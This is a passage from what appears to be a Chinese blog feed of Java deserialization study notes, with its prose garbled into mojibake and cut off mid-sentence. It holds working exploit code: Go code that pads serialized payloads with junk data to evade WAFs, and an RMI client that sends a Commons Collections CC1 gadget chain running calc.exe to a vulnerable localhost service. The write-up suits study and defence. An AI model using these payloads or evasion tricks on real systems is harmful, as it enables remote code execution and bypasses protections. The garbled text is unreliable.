ä¸€ä¸ªåŒ…å«åƒåœ¾æ•°æ®çš„åºåˆ—åŒ–æµ</h2><p>ä¸€èˆ¬åƒåœ¾æ•°æ®å¤šåŠæ˜¯ç»•è¿‡wafï¼Œè¿™é‡Œpç¥ä¹Ÿä»‹ç»äº†<strong>c0ny1</strong>å¸ˆå‚…çš„æ–‡ç« ã€‚<br> content æ˜¯ç”± object æˆ– blockdata ç»„æˆï¼Œ blockdata å°±æ˜¯ä¸€ä¸ªé€‚åˆç”¨æ¥å¡«å……è„å­—ç¬¦ã€‚</p><p>è¿™é‡Œå°±ä¸ç”¨pç¥çš„cc6äº†ï¼Œå› ä¸ºç”µè„‘é‡è£…ç³»ç»Ÿäº†ã€‚ï¼ˆæ–‡ä»¶å…¨æ²¡äº†ã€‚ï¼‰</p><h3 id="æ·»åŠ åƒåœ¾æ•°æ®ï¼ˆæ•°æ®åŒ…ä¹‹å‰ï¼‰"><a href="#æ·»åŠ åƒåœ¾æ•°æ®ï¼ˆæ•°æ®åŒ…ä¹‹å‰ï¼‰" class="headerlink" title="æ·»åŠ åƒåœ¾æ•°æ®ï¼ˆæ•°æ®åŒ…ä¹‹å‰ï¼‰"></a>æ·»åŠ åƒåœ¾æ•°æ®ï¼ˆæ•°æ®åŒ…ä¹‹å‰ï¼‰</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> main<br><span class="hljs-title function_">import</span> <span class="hljs-params">(</span><br><span class="hljs-params"><span class="hljs-string">&quot;github.com/phith0n/zkar/serz&quot;</span></span><br><span class="hljs-params"><span class="hljs-string">&quot;io/ioutil&quot;</span></span><br><span class="hljs-params"><span class="hljs-string">&quot;log&quot;</span></span><br><span class="hljs-params"><span class="hljs-string">&quot;strings&quot;</span></span><br><span class="hljs-params">)</span><br>func <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>data, _ := ioutil.ReadFile(<span class="hljs-string">&quot;xsw6_a.bin&quot;</span>)<br>serialization, err := serz.FromBytes(data)<br><span class="hljs-keyword">if</span> err != nil &#123;<br>log.Fatal(<span class="hljs-string">&quot;parse error&quot;</span>)<br>&#125;<br><span class="hljs-type">var</span> <span class="hljs-variable">blockData</span> <span class="hljs-operator">=</span> &amp;serz.TCContent&#123;<br>Flag: serz.JAVA_TC_BLOCKDATALONG,<br>BlockData: &amp;serz.TCBlockData&#123;<br>Data: []<span class="hljs-type">byte</span>(strings.Repeat(<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-number">40000</span>)),<br>&#125;,<br>&#125;<br>serialization.Contents = append(serialization.Contents, blockData)<br>ioutil.WriteFile(<span class="hljs-string">&quot;xsw6_a-padding.ser&quot;</span>, serialization.ToBytes(), 0o755)<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203232117599.png" alt="QQæˆªå›¾20220323203520"></p><p>ç»“æœå¦‚ä¸‹ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203232117195.png" alt="QQæˆªå›¾20220323203625"></p><p>å¯ä»¥çœ‹åˆ°aaaaå·²ç»å†™å…¥ã€‚<br>è¿™æ—¶å€™å»æ‰§è¡Œä¸€ä¸‹æ–°æ–‡ä»¶ã€‚<code>xsw6_a-padding.ser</code><br>æˆåŠŸå¼¹å‡ºè®¡ç®—å™¨ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203232039471.png" alt="QQæˆªå›¾20220323203855"></p><p>æˆåŠŸå†™å…¥åƒåœ¾æ•°æ®å¹¶ä¸”ä¸å½±å“ååºåˆ—åŒ–ç»“æœã€‚</p><h3 id="æ·»åŠ åƒåœ¾æ•°æ®ï¼ˆæ•°æ®åŒ…ä¹‹åï¼‰"><a href="#æ·»åŠ åƒåœ¾æ•°æ®ï¼ˆæ•°æ®åŒ…ä¹‹åï¼‰" class="headerlink" title="æ·»åŠ åƒåœ¾æ•°æ®ï¼ˆæ•°æ®åŒ…ä¹‹åï¼‰"></a>æ·»åŠ åƒåœ¾æ•°æ®ï¼ˆæ•°æ®åŒ…ä¹‹åï¼‰</h3><p>å¯»æ€è¿™è¿™ä¸ç®€å•ï¼Œtest.goé‡Œé¢çš„ä»£ç æ¢ä¸ªä½ç½®å°±è¡Œã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203232045611.png" alt="QQæˆªå›¾20220323204459"></p><p>emmmmä¸€æ‰§è¡Œå°±æŠ¥é”™ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203232117669.png" alt="QQæˆªå›¾20220323204532"></p><p>çœ‹äº†ä¸‹pç¥çš„ç»“åˆæŠ¥é”™ï¼Œä¸€ä¸‹æ˜ç™½ä¸ºä»€ä¹ˆpç¥è¿™ä¹ˆå†™ã€‚ï¼ˆä¸»è¦æ˜¯çœŸä¸€ç‚¹éƒ½ä¸æ‡‚goè¯­è¨€ï¼‰ã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">serialization.Contents = <span class="hljs-built_in">append</span>([]*serz.TCContent&#123;blockData&#125;,<br>serialization.Contents...)<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™é‡Œå¼¹ä¸å‡ºè®¡ç®—å™¨äº†ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203232057749.png" alt="QQæˆªå›¾20220323205735"></p><p>ç»§ç»­è·Ÿpç¥å­¦ä¹ äº†ä¸€ä¸‹ã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;github.com/phith0n/zkar/serz&quot;</span><br><span class="hljs-string">&quot;io/ioutil&quot;</span><br><span class="hljs-string">&quot;log&quot;</span><br>)<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>data, _ := ioutil.ReadFile(<span class="hljs-string">&quot;xsw6_a.bin&quot;</span>)<br>serialization, err := serz.FromBytes(data)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatal(<span class="hljs-string">&quot;parse error&quot;</span>)<br>&#125;<br><span class="hljs-keyword">var</span> contents []*serz.TCContent<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5000</span>; i++ &#123;<br><span class="hljs-keyword">var</span> blockData = &amp;serz.TCContent&#123;<br>Flag: serz.JAVA_TC_RESET,<br>&#125;<br>contents = <span class="hljs-built_in">append</span>(contents, blockData)<br>&#125;<br>serialization.Contents = <span class="hljs-built_in">append</span>(contents, serialization.Contents...)<br>ioutil.WriteFile(<span class="hljs-string">&quot;xsw6_a-padding.ser&quot;</span>, serialization.ToBytes(), <span class="hljs-number">0</span>o755)<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯¹æ¯”ä¸€ä¸‹å‰å+ç†è§£ä¸€ä¸‹pç¥è´´å‡ºæ¥çš„ä»£ç ã€‚ä¹Ÿå°±æ˜ç™½äº†pç¥è¯´çš„è¯ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203232108918.png" alt="QQæˆªå›¾20220323210554"></p><p>æ—¶å› ä¸ºæˆ‘ä»¬ contents é‡Œç¬¬ä¸€ä¸ªç»“æ„æ˜¯ä¸€ä¸ª blockdata ï¼Œæ‰€ä»¥ä¼šè¿›å…¥ case<br>TC_BLOCKDATALONG ä¸­ï¼Œè€Œè¿™é‡Œé¢å°±æŠ›å‡ºäº†å¼‚å¸¸ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203232117703.png" alt="QQæˆªå›¾20220323211439"></p><p>æˆåŠŸå¼¹å‡ºè®¡ç®—å™¨ã€‚</p><h2 id="æ³¨æ„"><a href="#æ³¨æ„" class="headerlink" title="æ³¨æ„"></a>æ³¨æ„</h2><p>å‰é¢åœ¨ object åå¡«å……ä¸€ä¸ª blockdata çš„æ–¹æ³•ä¹‹æ‰€ä»¥å¯è¡Œï¼Œå°±æ˜¯å› ä¸ºé¦–ä¸ªç»“æ„æ˜¯ object ï¼Œå¤„ç†å®Œåå<br>åºåˆ—åŒ–å°±ç»“æŸäº†ï¼Œ blockdata æ ¹æœ¬æ²¡æœ‰å¤„ç†ï¼Œä¹Ÿå°±ä¸ä¼šæŠ›å‡ºå¼‚å¸¸äº†ã€‚<br>é‚£ä¹ˆï¼Œæˆ‘ä»¬åˆ©ç”¨ contents æ¥å¡«å……åƒåœ¾å­—ç¬¦çš„æ–¹æ³•æ˜¯å¦è¿˜æœ‰æ•ˆå‘¢ï¼Ÿå½“ç„¶æœ‰æ•ˆï¼Œ<strong>åˆšåˆšæˆ‘ä»¬å·²ç»è¯´äº†ï¼Œåœ¨å¤„</strong><br><strong>ç† object å‰Javaä¼šä¸¢å¼ƒæ‰€æœ‰çš„ TC_RESET ï¼ˆå®é™…ä¸Šåœ¨Grammerä¸­ TC_RESET ä¹Ÿæ˜¯ object çš„ä¸€ç§ç»“</strong><br><strong>æ„ï¼‰ï¼Œé‚£ä¹ˆæˆ‘ä»¬ç”¨è¿™ä¸ªå­—ç¬¦æ¥å¡«å……ä¸å°±å¯ä»¥äº†å—ï¼Ÿ</strong></p>]]></content>
    
    
    <categories>
      
      <category>JavaWeb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RMIæ¶æ„æœåŠ¡å‚æ•°</title>
    <link href="/2022/03/22/RMI%E6%81%B6%E6%84%8F%E6%9C%8D%E5%8A%A1%E5%8F%82%E6%95%B0/"/>
    <url>/2022/03/22/RMI%E6%81%B6%E6%84%8F%E6%9C%8D%E5%8A%A1%E5%8F%82%E6%95%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="RMIæ¶æ„æœåŠ¡å‚æ•°"><a href="#RMIæ¶æ„æœåŠ¡å‚æ•°" class="headerlink" title="RMIæ¶æ„æœåŠ¡å‚æ•°"></a>RMIæ¶æ„æœåŠ¡å‚æ•°</h1><p>åœ¨è‡ªå·±å†™å®Œä¹‹åï¼Œæ„Ÿè§‰è®°å¿†æ›´åŠ æ·±åˆ»äº†ã€‚ä¹Ÿç†è§£çš„æ›´åŠ æ¸…æ¥šã€‚</p><p>è‡ªå·±å°±æ˜¯è¸©äº†å¾ˆä¹…çš„å‘ï¼ˆå¤§çº¦æ— è„‘äº†1hï¼‰ï¼Œè¿™é‡Œæˆ‘ä»¬è¦æ³¨æ„åˆ°è‡ªå·±çš„jdkç‰ˆæœ¬ï¼ˆå› ä¸ºè¿™é‡Œæˆ‘ä»¬ç»“åˆcc1æ¥è¿›è¡Œæ¼æ´æµ‹è¯•ï¼Œè¿˜è®°å¾—ccæ¼æ´ç‰ˆæœ¬åœ¨é¢åæ­£æœ‰ä¸ªç‰ˆæœ¬ä¹‹åå°±æ²¡äº†ï¼Œå¯¼è‡´æˆ‘ä¸€ç›´å¼¹ä¸å‡ºè®¡ç®—å™¨ã€‚ï¼‰è¿™é‡Œè¯´ä¸€ä¸‹æˆ‘çš„ç¯å¢ƒã€‚<br>æˆ‘ç°åœ¨ç”¨çš„<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203222150027.png" alt="QQæˆªå›¾20220322213250"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">project</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">modelVersion</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">modelVersion</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.example<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>Apache-Commons-Collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0-SNAPSHOT<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">project</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><h3 id="æ¥å£"><a href="#æ¥å£" class="headerlink" title="æ¥å£"></a>æ¥å£</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">RemoteInterface</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br><br>    String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(String name)</span> <span class="hljs-keyword">throws</span> RemoteException;<br><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">Goodbye</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception;<br><br>   String <span class="hljs-title function_">sayGoodbye</span><span class="hljs-params">(Object work)</span> <span class="hljs-keyword">throws</span> Exception;<br>&#125;<br></code></pre></td></tr></table></figure><p>é¦–å…ˆæˆ‘ä»¬è¿™é‡Œè¦æ‰©å±•<code>Remote</code>ï¼šä¸ºäº†è¿œç¨‹è°ƒç”¨ã€‚</p><h3 id="å®ç°æ¥å£"><a href="#å®ç°æ¥å£" class="headerlink" title="å®ç°æ¥å£"></a>å®ç°æ¥å£</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.server.RMIClientSocketFactory;<br><span class="hljs-keyword">import</span> java.rmi.server.RMIServerSocketFactory;<br><span class="hljs-keyword">import</span> java.rmi.server.UnicastRemoteObject;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RemoteTrue</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">UnicastRemoteObject</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">RemoteInterface</span> &#123;<br><br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-title function_">RemoteTrue</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-title function_">RemoteTrue</span><span class="hljs-params">(<span class="hljs-type">int</span> port)</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>        <span class="hljs-built_in">super</span>(port);<br>    &#125;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-title function_">RemoteTrue</span><span class="hljs-params">(<span class="hljs-type">int</span> port, RMIClientSocketFactory csf, RMIServerSocketFactory ssf)</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>        <span class="hljs-built_in">super</span>(port, csf, ssf);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(String name)</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;hi&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Goodbye</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayGoodbye</span><span class="hljs-params">(Object payload)</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>        System.out.println(payload);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;123&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰ä¸¤ç§æƒ…å†µï¼Œæ³¨æ„åˆ°è¿™é‡Œæˆ‘ä»¬æ˜¯ç»§æ‰¿äº†<code>UnicastRemoteObject</code> ï¼šç”¨äºè·å¾—ä¸€ä¸ªstubã€‚è¿™ä¸ªstubå°è£…äº†åº•å±‚ç»†èŠ‚ï¼Œç”¨äºå’Œè¿œç¨‹å¯¹è±¡è¿›è¡Œé€šä¿¡ã€‚</p><h3 id="è¿œç¨‹å¯¹è±¡æ³¨å†Œåˆ°RMI-Registry"><a href="#è¿œç¨‹å¯¹è±¡æ³¨å†Œåˆ°RMI-Registry" class="headerlink" title="è¿œç¨‹å¯¹è±¡æ³¨å†Œåˆ°RMI Registry"></a>è¿œç¨‹å¯¹è±¡æ³¨å†Œåˆ°RMI Registry</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> java.rmi.AlreadyBoundException;<br><span class="hljs-keyword">import</span> java.rmi.Naming;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIServer</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException, MalformedURLException, AlreadyBoundException, InterruptedException &#123;<br>        <span class="hljs-comment">// åˆ›å»ºè¿œç¨‹å¯¹è±¡å’Œæ³¨å†Œä¸­å¿ƒ</span><br>        <span class="hljs-type">RemoteInterface</span> <span class="hljs-variable">remoteObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteTrue</span>();<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        <span class="hljs-comment">// ç»‘å®š</span><br>        registry.rebind(<span class="hljs-string">&quot;Hello&quot;</span>, remoteObject);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œå€¼å¾—æ³¨æ„çš„ä¸€ç‚¹å°±æ˜¯ï¼šæˆ‘ä»¬å¯ä»¥åœ¨å®ç°æ¥å£çš„åœ°æ–¹ä¸ç”¨ç»§æ‰¿<code>UnicastRemoteObject</code>ï¼Œåœ¨è¿™é‡Œæ·»åŠ ä¸Š<strong>RemoteInterface skeleton &#x3D; (RemoteInterface) UnicastRemoteObject.exportObject(remoteObject, 0);</strong></p><p>è¿™é‡Œä¹Ÿå°±su18è¯´çš„è¿™é‡Œã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203222150579.png" alt="QQæˆªå›¾20220322213458"></p><h3 id="å®¢æˆ·ç«¯å®ç°æ”»å‡»"><a href="#å®¢æˆ·ç«¯å®ç°æ”»å‡»" class="headerlink" title="å®¢æˆ·ç«¯å®ç°æ”»å‡»"></a>å®¢æˆ·ç«¯å®ç°æ”»å‡»</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><span class="hljs-keyword">import</span> java.util.Arrays;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIClient</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry(<span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-number">1099</span>);<br>        System.out.println(Arrays.toString(registry.list()));<br><br>        <span class="hljs-type">RemoteInterface</span> <span class="hljs-variable">stub</span> <span class="hljs-operator">=</span> (RemoteInterface) registry.lookup(<span class="hljs-string">&quot;Hello&quot;</span>);<br>        System.out.println(stub.sayGoodbye(payload()));<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">payload</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        map.put(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-string">&quot;lala&quot;</span>);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">transformedMap</span> <span class="hljs-operator">=</span> TransformedMap.decorate(map, <span class="hljs-literal">null</span>, transformerChain);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">cl</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">ctor</span> <span class="hljs-operator">=</span> cl.getDeclaredConstructor(Class.class, Map.class);<br>        ctor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">instance</span> <span class="hljs-operator">=</span> ctor.newInstance(Target.class, transformedMap);<br>        <span class="hljs-keyword">return</span> instance;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ€»ç»“ä¸€ä¸‹ï¼š</p><p>1ã€ åˆ›å»ºè¿œç¨‹å¯¹è±¡å’Œæ³¨å†Œä¸­å¿ƒ<br>        <code>RemoteInterface remoteObject = new RemoteTrue();</code><br>        <code>Registry registry = 